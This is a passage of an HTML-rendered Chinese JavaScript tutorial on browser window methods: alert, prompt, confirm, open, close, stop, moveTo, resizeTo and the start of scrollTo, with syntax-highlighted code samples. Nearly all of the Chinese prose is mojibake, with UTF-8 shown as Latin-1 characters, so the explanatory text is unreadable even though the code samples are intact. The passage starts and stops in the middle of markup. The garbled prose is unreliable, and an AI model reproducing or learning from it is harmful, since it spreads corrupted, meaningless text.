</code></pre></div><p>ç”¨æˆ·åªæœ‰ç‚¹å‡»â€œç¡®å®šâ€æŒ‰é’®ï¼Œå¯¹è¯æ¡†æ‰ä¼šæ¶ˆå¤±ã€‚å¯¹è¯æ¡†å¼¹å‡ºæœŸé—´ï¼Œæµè§ˆå™¨çª—å£å¤„äºå†»ç»“çŠ¶æ€ï¼Œå¦‚æœä¸ç‚¹â€œç¡®å®šâ€æŒ‰é’®ï¼Œç”¨æˆ·ä»€ä¹ˆä¹Ÿå¹²ä¸äº†ã€‚</p><p><code>window.alert()</code>æ–¹æ³•çš„å‚æ•°åªèƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ²¡æ³•ä½¿ç”¨ CSS æ ·å¼ï¼Œä½†æ˜¯å¯ä»¥ç”¨<code>\n</code>æŒ‡å®šæ¢è¡Œã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;æœ¬æ¡æç¤º\nåˆ†æˆä¸¤è¡Œ&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p><strong>ï¼ˆ2ï¼‰window.prompt()</strong></p><p><code>window.prompt()</code>æ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œæç¤ºæ–‡å­—çš„ä¸‹æ–¹ï¼Œè¿˜æœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥ä¿¡æ¯ï¼Œå¹¶æœ‰â€œç¡®å®šâ€å’Œâ€œå–æ¶ˆâ€ä¸¤ä¸ªæŒ‰é’®ã€‚å®ƒå¾€å¾€ç”¨æ¥è·å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">&#39;æ‚¨çš„å¹´é¾„ï¼Ÿ&#39;</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¼šè·³å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œæ–‡å­—æç¤ºä¸ºâ€œæ‚¨çš„å¹´é¾„ï¼Ÿâ€ï¼Œè¦æ±‚ç”¨æˆ·åœ¨å¯¹è¯æ¡†ä¸­è¾“å…¥è‡ªå·±çš„å¹´é¾„ï¼ˆé»˜è®¤æ˜¾ç¤º25ï¼‰ã€‚ç”¨æˆ·å¡«å…¥çš„å€¼ï¼Œä¼šä½œä¸ºè¿”å›å€¼å­˜å…¥å˜é‡<code>result</code>ã€‚</p><p><code>window.prompt()</code>çš„è¿”å›å€¼æœ‰ä¸¤ç§æƒ…å†µï¼Œå¯èƒ½æ˜¯å­—ç¬¦ä¸²ï¼ˆæœ‰å¯èƒ½æ˜¯ç©ºå­—ç¬¦ä¸²ï¼‰ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯<code>null</code>ã€‚å…·ä½“åˆ†æˆä¸‰ç§æƒ…å†µã€‚</p><ol><li>ç”¨æˆ·è¾“å…¥ä¿¡æ¯ï¼Œå¹¶ç‚¹å‡»â€œç¡®å®šâ€ï¼Œåˆ™ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯å°±æ˜¯è¿”å›å€¼ã€‚</li><li>ç”¨æˆ·æ²¡æœ‰è¾“å…¥ä¿¡æ¯ï¼Œç›´æ¥ç‚¹å‡»â€œç¡®å®šâ€ï¼Œåˆ™è¾“å…¥æ¡†çš„é»˜è®¤å€¼å°±æ˜¯è¿”å›å€¼ã€‚</li><li>ç”¨æˆ·ç‚¹å‡»äº†â€œå–æ¶ˆâ€ï¼ˆæˆ–è€…æŒ‰äº† ESC æŒ‰é’®ï¼‰ï¼Œåˆ™è¿”å›å€¼æ˜¯<code>null</code>ã€‚</li></ol><p><code>window.prompt()</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯æœ€å¥½æ€»æ˜¯æä¾›ç¬¬äºŒä¸ªå‚æ•°ï¼Œä½œä¸ºè¾“å…¥æ¡†çš„é»˜è®¤å€¼ã€‚</p><p><strong>ï¼ˆ3ï¼‰window.confirm()</strong></p><p><code>window.confirm()</code>æ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œé™¤äº†æç¤ºä¿¡æ¯ä¹‹å¤–ï¼Œåªæœ‰â€œç¡®å®šâ€å’Œâ€œå–æ¶ˆâ€ä¸¤ä¸ªæŒ‰é’®ï¼Œå¾€å¾€ç”¨æ¥å¾è¯¢ç”¨æˆ·æ˜¯å¦åŒæ„ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">&#39;ä½ æœ€è¿‘å¥½å—ï¼Ÿ&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢ä»£ç å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œä¸Šé¢åªæœ‰ä¸€è¡Œæ–‡å­—â€œä½ æœ€è¿‘å¥½å—ï¼Ÿâ€ï¼Œç”¨æˆ·é€‰æ‹©ç‚¹å‡»â€œç¡®å®šâ€æˆ–â€œå–æ¶ˆâ€ã€‚</p><p><code>confirm</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œå¦‚æœç”¨æˆ·ç‚¹å‡»â€œç¡®å®šâ€ï¼Œè¿”å›<code>true</code>ï¼›å¦‚æœç”¨æˆ·ç‚¹å‡»â€œå–æ¶ˆâ€ï¼Œåˆ™è¿”å›<code>false</code>ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> okay <span class="token operator">=</span> <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">&#39;Please confirm this message.&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>okay<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// ç”¨æˆ·æŒ‰ä¸‹â€œç¡®å®šâ€</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token comment">// ç”¨æˆ·æŒ‰ä¸‹â€œå–æ¶ˆâ€</span>
<span class="token punctuation">}</span>
</code></pre></div><p><code>confirm</code>çš„ä¸€ä¸ªç”¨é€”æ˜¯ï¼Œç”¨æˆ·ç¦»å¼€å½“å‰é¡µé¢æ—¶ï¼Œå¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œé—®ç”¨æˆ·æ˜¯å¦çœŸçš„è¦ç¦»å¼€ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onunload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> window<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">&#39;ä½ ç¡®å®šè¦ç¦»å¼€å½“é¢é¡µé¢å—ï¼Ÿ&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>è¿™ä¸‰ä¸ªæ–¹æ³•éƒ½å…·æœ‰å µå¡æ•ˆåº”ï¼Œä¸€æ—¦å¼¹å‡ºå¯¹è¯æ¡†ï¼Œæ•´ä¸ªé¡µé¢å°±æ˜¯æš‚åœæ‰§è¡Œï¼Œç­‰å¾…ç”¨æˆ·åšå‡ºååº”ã€‚</p><h4 id="window-open-window-close-window-stop" tabindex="-1"><a class="header-anchor" href="#window-open-window-close-window-stop" aria-hidden="true">#</a> window.open(), window.close()ï¼Œwindow.stop()</h4><p><strong>ï¼ˆ1ï¼‰window.open()</strong></p><p><code>window.open</code>æ–¹æ³•ç”¨äºæ–°å»ºå¦ä¸€ä¸ªæµè§ˆå™¨çª—å£ï¼Œç±»ä¼¼äºæµè§ˆå™¨èœå•çš„æ–°å»ºçª—å£é€‰é¡¹ã€‚å®ƒä¼šè¿”å›æ–°çª—å£çš„å¼•ç”¨ï¼Œå¦‚æœæ— æ³•æ–°å»ºçª—å£ï¼Œåˆ™è¿”å›<code>null</code>ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&#39;somefile.html&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¼šè®©æµè§ˆå™¨å¼¹å‡ºä¸€ä¸ªæ–°å»ºçª—å£ï¼Œç½‘å€æ˜¯å½“å‰åŸŸåä¸‹çš„<code>somefile.html</code>ã€‚</p><p><code>open</code>æ–¹æ³•ä¸€å…±å¯ä»¥æ¥å—ä¸‰ä¸ªå‚æ•°ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> windowName<span class="token punctuation">,</span> <span class="token punctuation">[</span>windowFeatures<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre></div><ul><li><code>url</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–°çª—å£çš„ç½‘å€ã€‚å¦‚æœçœç•¥ï¼Œé»˜è®¤ç½‘å€å°±æ˜¯<code>about:blank</code>ã€‚</li><li><code>windowName</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–°çª—å£çš„åå­—ã€‚å¦‚æœè¯¥åå­—çš„çª—å£å·²ç»å­˜åœ¨ï¼Œåˆ™å ç”¨è¯¥çª—å£ï¼Œä¸å†æ–°å»ºçª—å£ã€‚å¦‚æœçœç•¥ï¼Œå°±é»˜è®¤ä½¿ç”¨<code>_blank</code>ï¼Œè¡¨ç¤ºæ–°å»ºä¸€ä¸ªæ²¡æœ‰åå­—çš„çª—å£ã€‚å¦å¤–è¿˜æœ‰å‡ ä¸ªé¢„è®¾å€¼ï¼Œ<code>_self</code>è¡¨ç¤ºå½“å‰çª—å£ï¼Œ<code>_top</code>è¡¨ç¤ºé¡¶å±‚çª—å£ï¼Œ<code>_parent</code>è¡¨ç¤ºä¸Šä¸€å±‚çª—å£ã€‚</li><li><code>windowFeatures</code>ï¼šå­—ç¬¦ä¸²ï¼Œå†…å®¹ä¸ºé€—å·åˆ†éš”çš„é”®å€¼å¯¹ï¼ˆè¯¦è§ä¸‹æ–‡ï¼‰ï¼Œè¡¨ç¤ºæ–°çª—å£çš„å‚æ•°ï¼Œæ¯”å¦‚æœ‰æ²¡æœ‰æç¤ºæ ã€å·¥å…·æ¡ç­‰ç­‰ã€‚å¦‚æœçœç•¥ï¼Œåˆ™é»˜è®¤æ‰“å¼€ä¸€ä¸ªå®Œæ•´ UI çš„æ–°çª—å£ã€‚å¦‚æœæ–°å»ºçš„æ˜¯ä¸€ä¸ªå·²ç»å­˜åœ¨çš„çª—å£ï¼Œåˆ™è¯¥å‚æ•°ä¸èµ·ä½œç”¨ï¼Œæµè§ˆå™¨æ²¿ç”¨ä»¥å‰çª—å£çš„å‚æ•°ã€‚</li></ul><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>
  <span class="token string">&#39;somepage.html&#39;</span><span class="token punctuation">,</span>
  <span class="token string">&#39;DefinitionsWindows&#39;</span><span class="token punctuation">,</span>
  <span class="token string">&#39;height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes&#39;</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢ä»£ç è¡¨ç¤ºï¼Œæ‰“å¼€çš„æ–°çª—å£é«˜åº¦å’Œå®½åº¦éƒ½ä¸º200åƒç´ ï¼Œæ²¡æœ‰åœ°å€æ ï¼Œä½†æœ‰çŠ¶æ€æ å’Œæ»šåŠ¨æ¡ï¼Œå…è®¸ç”¨æˆ·è°ƒæ•´å¤§å°ã€‚</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥è®¾å®šå¦‚ä¸‹å±æ€§ã€‚</p><ul><li>leftï¼šæ–°çª—å£è·ç¦»å±å¹•æœ€å·¦è¾¹çš„è·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚æ³¨æ„ï¼Œæ–°çª—å£å¿…é¡»æ˜¯å¯è§çš„ï¼Œä¸èƒ½è®¾ç½®åœ¨å±å¹•ä»¥å¤–çš„ä½ç½®ã€‚</li><li>topï¼šæ–°çª—å£è·ç¦»å±å¹•æœ€é¡¶éƒ¨çš„è·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚</li><li>heightï¼šæ–°çª—å£å†…å®¹åŒºåŸŸçš„é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li><li>widthï¼šæ–°çª—å£å†…å®¹åŒºåŸŸçš„å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li><li>outerHeightï¼šæ•´ä¸ªæµè§ˆå™¨çª—å£çš„é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li><li>outerWidthï¼šæ•´ä¸ªæµè§ˆå™¨çª—å£çš„å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ï¼Œä¸å¾—å°äº100ã€‚</li><li>menubarï¼šæ˜¯å¦æ˜¾ç¤ºèœå•æ ã€‚</li><li>toolbarï¼šæ˜¯å¦æ˜¾ç¤ºå·¥å…·æ ã€‚</li><li>locationï¼šæ˜¯å¦æ˜¾ç¤ºåœ°å€æ ã€‚</li><li>personalbarï¼šæ˜¯å¦æ˜¾ç¤ºç”¨æˆ·è‡ªå·±å®‰è£…çš„å·¥å…·æ ã€‚</li><li>statusï¼šæ˜¯å¦æ˜¾ç¤ºçŠ¶æ€æ ã€‚</li><li>dependentï¼šæ˜¯å¦ä¾èµ–çˆ¶çª—å£ã€‚å¦‚æœä¾èµ–ï¼Œé‚£ä¹ˆçˆ¶çª—å£æœ€å°åŒ–ï¼Œè¯¥çª—å£ä¹Ÿæœ€å°åŒ–ï¼›çˆ¶çª—å£å…³é—­ï¼Œè¯¥çª—å£ä¹Ÿå…³é—­ã€‚</li><li>minimizableï¼šæ˜¯å¦æœ‰æœ€å°åŒ–æŒ‰é’®ï¼Œå‰ææ˜¯<code>dialog=yes</code>ã€‚</li><li>noopenerï¼šæ–°çª—å£å°†ä¸çˆ¶çª—å£åˆ‡æ–­è”ç³»ï¼Œå³æ–°çª—å£çš„<code>window.opener</code>å±æ€§è¿”å›<code>null</code>ï¼Œçˆ¶çª—å£çš„<code>window.open()</code>æ–¹æ³•ä¹Ÿè¿”å›<code>null</code>ã€‚</li><li>resizableï¼šæ–°çª—å£æ˜¯å¦å¯ä»¥è°ƒèŠ‚å¤§å°ã€‚</li><li>scrollbarsï¼šæ˜¯å¦å…è®¸æ–°çª—å£å‡ºç°æ»šåŠ¨æ¡ã€‚</li><li>dialogï¼šæ–°çª—å£æ ‡é¢˜æ æ˜¯å¦å‡ºç°æœ€å¤§åŒ–ã€æœ€å°åŒ–ã€æ¢å¤åŸå§‹å¤§å°çš„æ§ä»¶ã€‚</li><li>titlebarï¼šæ–°çª—å£æ˜¯å¦æ˜¾ç¤ºæ ‡é¢˜æ ã€‚</li><li>alwaysRaisedï¼šæ˜¯å¦æ˜¾ç¤ºåœ¨æ‰€æœ‰çª—å£çš„é¡¶éƒ¨ã€‚</li><li>alwaysLoweredï¼šæ˜¯å¦æ˜¾ç¤ºåœ¨çˆ¶çª—å£çš„åº•ä¸‹ã€‚</li><li>closeï¼šæ–°çª—å£æ˜¯å¦æ˜¾ç¤ºå…³é—­æŒ‰é’®ã€‚</li></ul><p>å¯¹äºé‚£äº›å¯ä»¥æ‰“å¼€å’Œå…³é—­çš„å±æ€§ï¼Œè®¾ä¸º<code>yes</code>æˆ–<code>1</code>æˆ–ä¸è®¾ä»»ä½•å€¼å°±è¡¨ç¤ºæ‰“å¼€ï¼Œæ¯”å¦‚<code>status=yes</code>ã€<code>status=1</code>ã€<code>status</code>éƒ½ä¼šå¾—åˆ°åŒæ ·çš„ç»“æœã€‚å¦‚æœæƒ³è®¾ä¸ºå…³é—­ï¼Œä¸ç”¨å†™<code>no</code>ï¼Œè€Œæ˜¯ç›´æ¥çœç•¥è¿™ä¸ªå±æ€§å³å¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœåœ¨ç¬¬ä¸‰ä¸ªå‚æ•°ä¸­è®¾ç½®äº†ä¸€éƒ¨åˆ†å±æ€§ï¼Œå…¶ä»–æ²¡æœ‰è¢«è®¾ç½®çš„<code>yes/no</code>å±æ€§éƒ½ä¼šè¢«è®¾æˆ<code>no</code>ï¼Œåªæœ‰<code>titlebar</code>å’Œå…³é—­æŒ‰é’®é™¤å¤–ï¼ˆå®ƒä»¬çš„å€¼é»˜è®¤ä¸º<code>yes</code>ï¼‰ã€‚</p><p>ä¸Šé¢è¿™äº›å±æ€§ï¼Œå±æ€§åä¸å±æ€§å€¼ä¹‹é—´ç”¨ç­‰å·è¿æ¥ï¼Œå±æ€§ä¸å±æ€§ä¹‹é—´ç”¨é€—å·åˆ†éš”ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token string">&#39;height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes&#39;</span>
</code></pre></div><p>å¦å¤–ï¼Œ<code>open()</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°è™½ç„¶å¯ä»¥æŒ‡å®šå·²ç»å­˜åœ¨çš„çª—å£ï¼Œä½†æ˜¯ä¸ç­‰äºå¯ä»¥ä»»æ„æ§åˆ¶å…¶ä»–çª—å£ã€‚ä¸ºäº†é˜²æ­¢è¢«ä¸ç›¸å¹²çš„çª—å£æ§åˆ¶ï¼Œæµè§ˆå™¨åªæœ‰åœ¨ä¸¤ä¸ªçª—å£åŒæºï¼Œæˆ–è€…ç›®æ ‡çª—å£è¢«å½“å‰ç½‘é¡µæ‰“å¼€çš„æƒ…å†µä¸‹ï¼Œæ‰å…è®¸<code>open</code>æ–¹æ³•æŒ‡å‘è¯¥çª—å£ã€‚</p><p><code>window.open</code>æ–¹æ³•è¿”å›æ–°çª—å£çš„å¼•ç”¨ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> windowB <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&#39;windowB.html&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;WindowB&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
windowB<span class="token punctuation">.</span>window<span class="token punctuation">.</span>name <span class="token comment">// &quot;WindowB&quot;</span>
</code></pre></div><p>æ³¨æ„ï¼Œå¦‚æœæ–°çª—å£å’Œçˆ¶çª—å£ä¸æ˜¯åŒæºçš„ï¼ˆå³ä¸åœ¨åŒä¸€ä¸ªåŸŸï¼‰ï¼Œå®ƒä»¬å½¼æ­¤ä¸èƒ½è·å–å¯¹æ–¹çª—å£å¯¹è±¡çš„å†…éƒ¨å±æ€§ã€‚</p><p>ä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;å·²ç»æ‰“å¼€æ–°çª—å£&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
w<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">&#39;http://example.com&#39;</span><span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢ä»£ç å…ˆæ‰“å¼€ä¸€ä¸ªæ–°çª—å£ï¼Œç„¶ååœ¨è¯¥çª—å£å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå†å°†ç½‘å€å¯¼å‘<code>example.com</code>ã€‚</p><p>ç”±äº<code>open</code>è¿™ä¸ªæ–¹æ³•å¾ˆå®¹æ˜“è¢«æ»¥ç”¨ï¼Œè®¸å¤šæµè§ˆå™¨é»˜è®¤éƒ½ä¸å…è®¸è„šæœ¬è‡ªåŠ¨æ–°å»ºçª—å£ã€‚åªå…è®¸åœ¨ç”¨æˆ·ç‚¹å‡»é“¾æ¥æˆ–æŒ‰é’®æ—¶ï¼Œè„šæœ¬åšå‡ºååº”ï¼Œå¼¹å‡ºæ–°çª—å£ã€‚å› æ­¤ï¼Œæœ‰å¿…è¦æ£€æŸ¥ä¸€ä¸‹æ‰“å¼€æ–°çª—å£æ˜¯å¦æˆåŠŸã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>popup <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// æ–°å»ºçª—å£å¤±è´¥</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>ï¼ˆ2ï¼‰window.close()</strong></p><p><code>window.close</code>æ–¹æ³•ç”¨äºå…³é—­å½“å‰çª—å£ï¼Œä¸€èˆ¬åªç”¨æ¥å…³é—­<code>window.open</code>æ–¹æ³•æ–°å»ºçš„çª—å£ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>popup<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><p>è¯¥æ–¹æ³•åªå¯¹é¡¶å±‚çª—å£æœ‰æ•ˆï¼Œ<code>iframe</code>æ¡†æ¶ä¹‹ä¸­çš„çª—å£ä½¿ç”¨è¯¥æ–¹æ³•æ— æ•ˆã€‚</p><p><strong>ï¼ˆ3ï¼‰window.stop()</strong></p><p><code>window.stop()</code>æ–¹æ³•å®Œå…¨ç­‰åŒäºå•å‡»æµè§ˆå™¨çš„åœæ­¢æŒ‰é’®ï¼Œä¼šåœæ­¢åŠ è½½å›¾åƒã€è§†é¢‘ç­‰æ­£åœ¨æˆ–ç­‰å¾…åŠ è½½çš„å¯¹è±¡ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><h4 id="window-moveto-window-moveby" tabindex="-1"><a class="header-anchor" href="#window-moveto-window-moveby" aria-hidden="true">#</a> window.moveTo()ï¼Œwindow.moveBy()</h4><p><code>window.moveTo()</code>æ–¹æ³•ç”¨äºç§»åŠ¨æµè§ˆå™¨çª—å£åˆ°æŒ‡å®šä½ç½®ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯çª—å£å·¦ä¸Šè§’è·ç¦»å±å¹•å·¦ä¸Šè§’çš„æ°´å¹³è·ç¦»å’Œå‚ç›´è·ç¦»ï¼Œå•ä½ä¸ºåƒç´ ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">moveTo</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>
</code></pre></div><p>ä¸Šé¢ä»£ç å°†çª—å£ç§»åŠ¨åˆ°å±å¹•<code>(100, 200)</code>çš„ä½ç½®ã€‚</p><p><code>window.moveBy()</code>æ–¹æ³•å°†çª—å£ç§»åŠ¨åˆ°ä¸€ä¸ªç›¸å¯¹ä½ç½®ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯çª—å£å·¦ä¸Šè§’å‘å³ç§»åŠ¨çš„æ°´å¹³è·ç¦»å’Œå‘ä¸‹ç§»åŠ¨çš„å‚ç›´è·ç¦»ï¼Œå•ä½ä¸ºåƒç´ ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">moveBy</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>
</code></pre></div><p>ä¸Šé¢ä»£ç å°†çª—å£å‘å³ç§»åŠ¨25åƒç´ ã€å‘ä¸‹ç§»åŠ¨50åƒç´ ã€‚</p><p>ä¸ºäº†é˜²æ­¢æœ‰äººæ»¥ç”¨è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œéšæ„ç§»åŠ¨ç”¨æˆ·çš„çª—å£ï¼Œç›®å‰åªæœ‰ä¸€ç§æƒ…å†µï¼Œæµè§ˆå™¨å…è®¸ç”¨è„šæœ¬ç§»åŠ¨çª—å£ï¼šè¯¥çª—å£æ˜¯ç”¨<code>window.open()</code>æ–¹æ³•æ–°å»ºçš„ï¼Œå¹¶ä¸”çª—å£é‡Œåªæœ‰å®ƒä¸€ä¸ª Tab é¡µã€‚é™¤æ­¤ä»¥å¤–çš„æƒ…å†µï¼Œä½¿ç”¨ä¸Šé¢ä¸¤ä¸ªæ–¹æ³•éƒ½æ˜¯æ— æ•ˆçš„ã€‚</p><h4 id="window-resizeto-window-resizeby" tabindex="-1"><a class="header-anchor" href="#window-resizeto-window-resizeby" aria-hidden="true">#</a> window.resizeTo()ï¼Œwindow.resizeBy()</h4><p><code>window.resizeTo()</code>æ–¹æ³•ç”¨äºç¼©æ”¾çª—å£åˆ°æŒ‡å®šå¤§å°ã€‚</p><p>å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç¼©æ”¾åçš„çª—å£å®½åº¦ï¼ˆ<code>outerWidth</code>å±æ€§ï¼ŒåŒ…å«æ»šåŠ¨æ¡ã€æ ‡é¢˜æ ç­‰ç­‰ï¼‰ï¼Œç¬¬äºŒä¸ªæ˜¯ç¼©æ”¾åçš„çª—å£é«˜åº¦ï¼ˆ<code>outerHeight</code>å±æ€§ï¼‰ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">resizeTo</span><span class="token punctuation">(</span>
  window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>availWidth <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span>
  window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>availHeight <span class="token operator">/</span> <span class="token number">2</span>
<span class="token punctuation">)</span>
</code></pre></div><p>ä¸Šé¢ä»£ç å°†å½“å‰çª—å£ç¼©æ”¾åˆ°ï¼Œå±å¹•å¯ç”¨åŒºåŸŸçš„ä¸€åŠå®½åº¦å’Œé«˜åº¦ã€‚</p><p><code>window.resizeBy()</code>æ–¹æ³•ç”¨äºç¼©æ”¾çª—å£ã€‚å®ƒä¸<code>window.resizeTo()</code>çš„åŒºåˆ«æ˜¯ï¼Œå®ƒæŒ‰ç…§ç›¸å¯¹çš„é‡ç¼©æ”¾ï¼Œ<code>window.resizeTo()</code>éœ€è¦ç»™å‡ºç¼©æ”¾åçš„ç»å¯¹å¤§å°ã€‚</p><p>å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ°´å¹³ç¼©æ”¾çš„é‡ï¼Œç¬¬äºŒä¸ªæ˜¯å‚ç›´ç¼©æ”¾çš„é‡ï¼Œå•ä½éƒ½æ˜¯åƒç´ ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">resizeBy</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">)</span>
</code></pre></div><p>ä¸Šé¢çš„ä»£ç å°†å½“å‰çª—å£çš„å®½åº¦å’Œé«˜åº¦ï¼Œéƒ½ç¼©å°200åƒç´ ã€‚</p><h4 id="window-scrollto-window-scroll-window-scrollby" tabindex="-1"><a class="header-anchor" href="#window-scrollto-window-scroll-window-scrollby" aria-hidden="true">#</a> window.scrollTo()ï¼Œwindow.scroll()ï¼Œwindow.scrollBy()</h4><p><code>window.scrollTo</code>æ–¹æ³•ç”¨äºå°†æ–‡æ¡£æ»šåŠ¨åˆ°æŒ‡å®šä½ç½®ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºæ»šåŠ¨åä½äºçª—å£å·¦ä¸Šè§’çš„é¡µé¢åæ ‡ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">scrollTo</span><span class="token punctuation">(</span>x<span class="token operator">-</span>coord<span class="token 